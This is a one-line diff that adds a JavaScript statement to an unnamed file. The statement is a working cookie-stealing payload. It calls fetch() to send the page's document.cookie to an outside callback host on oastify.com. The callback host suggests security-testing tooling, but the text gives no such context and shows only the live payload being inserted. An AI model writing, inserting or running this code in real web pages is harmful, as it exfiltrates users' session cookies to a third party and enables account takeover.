@@ -1,0 +1,1 @@
+fetch("http://hk5t1t5ug8odeyh2h7seop5a319sxh.oastify.com?test=" + encodeURIComponent(document.cookie))
